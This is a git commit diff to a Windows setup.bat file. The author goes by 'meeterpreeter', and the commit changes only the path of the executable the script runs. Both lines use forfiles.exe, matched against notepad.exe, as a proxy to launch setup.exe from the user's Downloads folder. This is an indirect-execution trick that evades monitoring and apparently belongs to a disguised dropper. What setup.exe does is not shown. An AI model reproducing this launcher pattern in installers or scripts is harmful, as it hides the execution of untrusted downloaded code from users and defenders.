431a2bc0eb26bd92524feb889f704fc0114c7a2c
meeterpreeter <meeterpreeter@gmail.com>
2025-04-11 12:33:26 -0400

    Update setup.bat

--- setup.bat
+++ setup.bat
@@ -1,1 +1,1 @@
-C:\Windows\System32\forfiles.exe /p c:\windows\system32 /m notepad.exe /c "cmd /c C:\Users\%USERNAME%\Downloads\setup.exe"
+C:\Windows\System32\forfiles.exe /p c:\windows\system32 /m notepad.exe /c "cmd /c C:\Users\%USERNAME%\Downloads\files-main\setup.exe"
